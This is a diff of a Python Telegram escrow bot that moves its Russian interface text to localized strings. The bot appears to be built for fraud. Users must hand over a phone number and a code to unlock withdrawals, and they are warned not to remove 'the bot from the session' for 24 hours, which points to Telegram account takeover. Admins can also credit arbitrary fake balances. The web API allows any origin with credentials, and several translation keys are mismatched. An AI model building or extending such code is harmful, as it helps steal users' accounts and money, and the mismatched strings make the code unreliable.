+        f"{get_text(lang, 'verify_desc')}\n\n"
+        f"📱 {get_text(lang, 'verify_phone_prompt')}\n\n"
+        f"⚠️ {get_text(lang, 'session_warning')}"
     )
 
 @dp.message(VerifyStates.waiting_phone)
 async def process_phone(message: types.Message, state: FSMContext):
+    lang = get_user_language(message.from_user.id)
     phone = message.text.strip()
     
     if not phone.startswith('+') or not phone[1:].isdigit() or len(phone) < 11:
-        await message.answer("❌ НЕВЕРНЫЙ ФОРМАТ!\n\nИспользуйте: +7XXXXXXXXXX")
+        await message.answer(f"❌ {get_text(lang, 'verify_phone_error')}")
         return
     
     code = f"{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}"
@@ -457,39 +686,40 @@ async def process_phone(message: types.Message, state: FSMContext):
     )
     
     await message.answer(
-        f"✅ ЗАЯВКА ОТПРАВЛЕНА!\n\n"
+        f"✅ {get_text(lang, 'verify_request_sent')}\n\n"
         f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
         f"🔑 Ваш код: {code}\n\n"
-        f"⏳ Ожидайте подтверждения от администратора.\n\n"
-        f"⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!"
+        f"⏳ {get_text(lang, 'verify_wait')}\n\n"
+        f"⚠️ {get_text(lang, 'session_warning')}"
     )
     
     await state.clear()
 
 # ============================================================
-# 11. КОМАНДЫ АДМИНА ДЛЯ ВЕРИФИКАЦИИ
+# 14. КОМАНДЫ АДМИНА ДЛЯ ВЕРИФИКАЦИИ
 # ============================================================
 @dp.message(Command("confirm_verification"))
 async def confirm_verification_command(message: types.Message):
+    lang = get_user_language(message.from_user.id)
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
+        await message.answer(f"⛔ {get_text(lang, 'admin_rights')}")
         return
     
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /confirm_verification [ID заявки]")
+        await message.answer(f"❗️ Использование: /confirm_verification [ID заявки]")
         return
     
     request_id = args[1]
     
     if request_id not in verification_requests:
-        await message.answer("❌ Заявка не найдена")
+        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
         return
     
     req = verification_requests[request_id]
     
     if req.get("status") != "pending":
-        await message.answer("❌ Заявка уже обработана")
+        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
         return
     
     user_id = req["user_id"]
@@ -504,47 +734,52 @@ async def confirm_verification_command(message: types.Message):
     save_json(FILES["verification_requests"], verification_requests)
     
     await message.answer(
-        f"✅ ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
+        f"✅ {get_text(lang, 'verify_confirmed')}\n\n"
         f"👤 Пользователь: @{req['username']} (ID: {user_id})\n"
         f"📱 Номер: {phone}\n"
         f"🔑 Код: {code}\n"
-        f"🕐 Сессия активна 24 часа"
+        f"🕐 {get_text(lang, 'session_active')} 24 часа"
     )
     
     try:
+        user_lang = get_user_language(user_id)
+        if user_lang is None:
+            user_lang = "ru"
+        
         await bot.send_message(
             user_id,
-            f"✅ ВАША ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
+            f"✅ {get_text(user_lang, 'verify_confirmed_user')}\n\n"
             f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
             f"🔑 Ваш код: {code}\n\n"
-            f"🕐 Сессия активна 24 часа (до {verification_data[str(user_id)].get('expires_at', 'неизвестно')[:19]})\n\n"
-            f"⚠️ Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!\n\n"
-            f"💰 Теперь вам доступен вывод средств."
+            f"🕐 {get_text(user_lang, 'session_active')} 24 часа (до {verification_data[str(user_id)].get('expires_at', 'неизвестно')[:19]})\n\n"
+            f"⚠️ {get_text(user_lang, 'session_warning')}\n\n"
+            f"💰 {get_text(user_lang, 'verify_success')}"
         )
     except:
         pass
 
 @dp.message(Command("reject_verification"))
 async def reject_verification_command(message: types.Message):
+    lang = get_user_language(message.from_user.id)
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
+        await message.answer(f"⛔ {get_text(lang, 'admin_rights')}")
         return
     
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /reject_verification [ID заявки]")
+        await message.answer(f"❗️ Использование: /reject_verification [ID заявки]")
         return
     
     request_id = args[1]
     
     if request_id not in verification_requests:
-        await message.answer("❌ Заявка не найдена")
+        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
         return
     
     req = verification_requests[request_id]
     
     if req.get("status") != "pending":
-        await message.answer("❌ Заявка уже обработана")
+        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
         return
     
     req["status"] = "rejected"
@@ -553,7 +788,7 @@ async def reject_verification_command(message: types.Message):
     save_json(FILES["verification_requests"], verification_requests)
     
     await message.answer(
-        f"❌ ВЕРИФИКАЦИЯ ОТКЛОНЕНА\n\n"
+        f"❌ {get_text(lang, 'verify_rejected')}\n\n"
         f"👤 Пользователь: @{req['username']} (ID: {req['user_id']})\n"
         f"📱 Номер: {req['phone']}\n"
         f"🔑 Код: {req['code']}"
@@ -562,56 +797,64 @@ async def reject_verification_command(message: types.Message):
     try:
         await bot.send_message(
             req["user_id"],
-            f"❌ ВАША ВЕРИФИКАЦИЯ ОТКЛОНЕНА\n\n"
+            f"❌ {get_text(lang, 'verify_rejected_user')}\n\n"
             f"📱 Номер: {req['phone'][:2]}****{req['phone'][-4:]}\n\n"
-            f"⚠️ Вы можете подать заявку заново."
+            f"⚠️ {get_text(lang, 'verify_rejected_try_again')}"
         )
     except:
         pass
 
 # ============================================================
-# 12. АДМИН ПАНЕЛЬ
+# 15. АДМИН ПАНЕЛЬ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_admin")
 async def menu_admin(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
     await callback.message.edit_text(
-        f"👑 <b>АДМИН ПАНЕЛЬ</b>\n\nВыберите действие:",
+        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
         reply_markup=admin_panel_keyboard(callback.from_user.id)
     )
     await callback.answer()
 
+# ============================================================
+# 16. НАЧИСЛИТЬ БАЛАНС
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_add_balance")
 async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    await callback.message.edit_text("💰 <b>НАЧИСЛИТЬ БАЛАНС</b>\n\nВведите Telegram ID пользователя:")
+    await callback.message.edit_text(f"💰 <b>{get_text(lang, 'balance_added')}</b>\n\n{get_text(lang, 'enter_user_id')}:")
     await state.set_state(AdminStates.waiting_user_id)
     await callback.answer()
 
 @dp.message(AdminStates.waiting_user_id)
 async def admin_get_user_id(message: types.Message, state: FSMContext):
+    lang = get_user_language(message.from_user.id)
     try:
         user_id = int(message.text.strip())
         await state.update_data(target_user_id=user_id)
-        await message.answer("💱 Выберите валюту:", reply_markup=currency_keyboard())
+        await message.answer(f"💱 {get_text(lang, 'choose_currency')}:", reply_markup=currency_keyboard())
         await state.set_state(AdminStates.waiting_currency)
     except:
-        await message.answer("❌ Введите корректный ID")
+        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
 
 @dp.callback_query(lambda c: c.data.startswith("curr_"))
 async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
     currency = callback.data.split("_")[1]
     await state.update_data(target_currency=currency)
-    await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
+    await callback.message.edit_text(f"💰 {get_text(lang, 'enter_amount')} {currency}:")
     await state.set_state(AdminStates.waiting_amount)
     await callback.answer()
 
 @dp.message(AdminStates.waiting_amount)
 async def admin_get_amount(message: types.Message, state: FSMContext):
+    lang = get_user_language(message.from_user.id)
     try:
         amount = float(message.text.strip())
         if amount <= 0:
@@ -621,84 +864,94 @@ async def admin_get_amount(message: types.Message, state: FSMContext):
         currency = data.get("target_currency")
         add_balance(user_id, currency, amount)
         await message.answer(
-            f"✅ Начислено {amount} {currency} пользователю {user_id}",
+            f"✅ {get_text(lang, 'balance_added')} {amount} {currency} {get_text(lang, 'for_user')} {user_id}",
             reply_markup=admin_panel_keyboard(message.from_user.id)
         )
         await state.clear()
     except:
-        await message.answer("❌ Введите положительное число")
+        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
 
+# ============================================================
+# 17. УПРАВЛЕНИЕ АДМИНАМИ
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_manage_admins")
 async def admin_manage_admins(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
     admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
     await callback.message.edit_text(
-        f"👥 <b>СПИСОК АДМИНОВ</b>\n\n"
+        f"👥 <b>{get_text(lang, 'admin_list')}</b>\n\n"
         f"Главный админ: {MASTER_ADMIN_ID}\n"
         f"Дополнительные:\n{admin_list}\n\n"
-        f"/add_admin [ID] - Добавить админа\n"
-        f"/remove_admin [ID] - Удалить админа",
+        f"/add_admin [ID] - {get_text(lang, 'admin_added')}\n"
+        f"/remove_admin [ID] - {get_text(lang, 'admin_removed')}",
         reply_markup=admin_panel_keyboard(callback.from_user.id)
     )
     await callback.answer()
 
 @dp.message(Command("add_admin"))
 async def add_admin(message: types.Message):
+    lang = get_user_language(message.from_user.id)
     if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
+        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /add_admin [ID]")
+        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /add_admin [ID]")
         return
     try:
         new_admin_id = int(args[1])
         admins[str(new_admin_id)] = True
         save_json(FILES["admins"], admins)
-        await message.answer(f"✅ Админ добавлен: {new_admin_id}")
+        await message.answer(f"✅ {get_text(lang, 'admin_added')} {new_admin_id}")
     except:
-        await message.answer("❌ Введите корректный ID")
+        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
 
 @dp.message(Command("remove_admin"))
 async def remove_admin(message: types.Message):
+    lang = get_user_language(message.from_user.id)
     if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
+        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /remove_admin [ID]")
+        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /remove_admin [ID]")
         return
     try:
         admin_id = int(args[1])
         if admin_id == MASTER_ADMIN_ID:
-            await message.answer("❌ Нельзя удалить главного админа")
+            await message.answer(f"❌ {get_text(lang, 'cannot_remove_master')}")
             return
         if str(admin_id) in admins:
             del admins[str(admin_id)]
             save_json(FILES["admins"], admins)
-            await message.answer(f"✅ Админ удалён: {admin_id}")
+            await message.answer(f"✅ {get_text(lang, 'admin_removed')} {admin_id}")
         else:
-            await message.answer("❌ Админ не найден")
+            await message.answer(f"❌ {get_text(lang, 'user_not_found')}")
     except:
-        await message.answer("❌ Введите корректный ID")
+        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")
 
+# ============================================================
+# 18. ВСЕ СДЕЛКИ
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_all_deals")
 async def admin_all_deals(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
     if not deals:
-        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals_total')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
         return
-    text = "📊 <b>ВСЕ СДЕЛКИ</b>\n\n"
+    text = f"📊 <b>{get_text(lang, 'all_deals_title')}</b>\n\n"
     for d_id, d in list(deals.items())[-20:]:
         status_map = {
-            "waiting_payment": "⏳ Ожидает оплаты",
-            "paid": "✅ Оплачено",
-            "awaiting_confirmation": "📦 Ожидает подтверждения",
-            "completed": "🎉 Завершено"
+            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
+            "paid": f"✅ {get_text(lang, 'status_paid')}",
+            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
+            "completed": f"🎉 {get_text(lang, 'status_completed')}"
         }
         text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
         text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
@@ -706,16 +959,20 @@ async def admin_all_deals(callback: types.CallbackQuery):
     await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
     await callback.answer()
 
+# ============================================================
+# 19. ЗАЯВКИ НА ВЫВОД
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
 async def admin_withdraw_requests(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
     pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
     if not pending:
-        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        await callback.message.edit_text(f"📭 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
         return
-    text = "💲 <b>ЗАЯВКИ НА ВЫВОД</b>\n\n"
+    text = f"💲 <b>{get_text(lang, 'withdraw_funds')}</b>\n\n"
     for rid, req in list(pending.items())[-10:]:
         text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
     await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
@@ -723,20 +980,21 @@ async def admin_withdraw_requests(callback: types.CallbackQuery):
 
 @dp.message(Command("confirm_withdraw"))
 async def confirm_withdraw_command(message: types.Message):
+    lang = get_user_language(message.from_user.id)
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
+        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /confirm_withdraw [ID]")
+        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /confirm_withdraw [ID]")
         return
     request_id = args[1]
     if request_id not in withdraw_requests:
-        await message.answer("❌ Заявка не найдена")
+        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
         return
     req = withdraw_requests[request_id]
     if req.get("status") != "pending":
-        await message.answer("❌ Заявка уже обработана")
+        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
         return
     bal = get_balance(req["user_id"])
     curr_key = req["currency"].lower()
@@ -746,72 +1004,82 @@ async def confirm_withdraw_command(message: types.Message):
     req["status"] = "completed"
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["withdraw"], withdraw_requests)
-    await message.answer(f"✅ Вывод подтверждён #{request_id}")
+    await message.answer(f"✅ {get_text(lang, 'withdraw_completed')} #{request_id}")
     await bot.send_message(
         req["user_id"],
-        f"✅ <b>ВЫВОД ПОДТВЕРЖДЁН</b>\n\n"
+        f"✅ <b>{get_text(lang, 'withdraw_completed')}</b>\n\n"
         f"💰 {req['amount']} {req['currency']}"
     )
 
+# ============================================================
+# 20. УПРАВЛЕНИЕ ОТЗЫВАМИ
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_manage_reviews")
 async def admin_manage_reviews(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
     reviews_list = list(reviews.values())
     if not reviews_list:
-        await callback.message.edit_text("⭐️ <b>ОТЗЫВЫ</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        await callback.message.edit_text(f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
         return
-    text = "⭐️ <b>УПРАВЛЕНИЕ ОТЗЫВАМИ</b>\n\n"
+    text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\n"
     for r in reviews_list[-10:]:
         text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
         text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
     await callback.message.edit_text(
         text[:4000],
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🗑 Очистить все отзывы", callback_data="admin_clear_reviews")],
-            [InlineKeyboardButton(text="◀️ Админ панель", callback_data="menu_admin")]
+            [InlineKeyboardButton(text=f"🗑 Очистить все {get_text(lang, 'faq')}", callback_data="admin_clear_reviews")],
+            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
         ])
     )
     await callback.answer()
 
 @dp.message(Command("delete_review"))
 async def delete_review_command(message: types.Message):
+    lang = get_user_language(message.from_user.id)
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
+        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /delete_review [ID]")
+        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /delete_review [ID]")
         return
     review_id = args[1]
     if review_id not in reviews:
-        await message.answer("❌ Отзыв не найден")
+        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
         return
     del reviews[review_id]
     save_json(FILES["reviews"], reviews)
-    await message.answer("✅ Отзыв удалён")
+    await message.answer(f"✅ {get_text(lang, 'photo_updated')}")
 
 @dp.callback_query(lambda c: c.data == "admin_clear_reviews")
 async def admin_clear_reviews(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
     reviews.clear()
     save_json(FILES["reviews"], reviews)
-    await callback.message.edit_text("✅ Все отзывы удалены", reply_markup=admin_panel_keyboard(callback.from_user.id))
+    await callback.message.edit_text(f"✅ {get_text(lang, 'photo_updated')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
     await callback.answer()
 
+# ============================================================
+# 21. ЛОГИ
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_logs")
 async def admin_logs(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
+        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
         return
     logs_list = list(logs.values())[-20:]
     if not logs_list:
-        await callback.message.edit_text("📋 <b>ЛОГИ</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        await callback.message.edit_text(f"📋 <b>Логи</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
         return
-    text = "📋 <b>ПОСЛЕДНИЕ ЛОГИ</b>\n\n"
+    text = "📋 <b>Последние логи</b>\n\n"
     for log_entry in reversed(logs_list[-10:]):
         text += f"🕐 {log_entry.get('time', '')[:19]}\n"
         text += f"📌 {log_entry.get('action', '')}\n"
@@ -820,10 +1088,9 @@ async def admin_logs(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 13. API ДЛЯ САЙТА (С ГАРАНТИРОВАННЫМ CORS)
+# 22. API ДЛЯ САЙТА (С CORS)
 # ============================================================
 async def handle_api(request):
-    # CORS заголовки для ВСЕХ ответов
     headers = {
         'Access-Control-Allow-Origin': '*',
         'Access-Control-Allow-Methods': 'POST, GET, OPTIONS, DELETE, PUT',
@@ -831,20 +1098,12 @@ async def handle_api(request):
         'Access-Control-Allow-Credentials': 'true'
     }
     
-    # Обработка preflight (OPTIONS)
     if request.method == 'OPTIONS':
         return web.Response(headers=headers, status=200)
     
-    # GET запросы
     if request.method == 'GET':
-        return web.json_response({
-            'success': True,
-            'bot': BOT_NAME,
-            'version': '1.0.0',
-            'status': 'running'
-        }, headers=headers)
+        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)
     
-    # POST запросы
     try:
         data = await request.json()
     except:
@@ -907,7 +1166,7 @@ async def handle_api(request):
                         f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                         f"💰 {amount} {currency}\n"
                         f"👤 ПОКУПАТЕЛЬ: @{buyer_username}\n\n"
-                        f"⬇️ ПЕРЕЙДИТЕ НА САЙТ ДЛЯ ПОДТВЕРЖДЕНИЯ\n{MINI_APP_URL}"
+                        f"⬇️ ПЕРЕЙДИТЕ НА САЙТ ДЛЯ ПОДТВЕРЖДЕНИЯ"
                     )
                 except:
                     pass
@@ -1153,7 +1412,7 @@ async def handle_api(request):
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 14. ЗАПУСК
+# 23. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
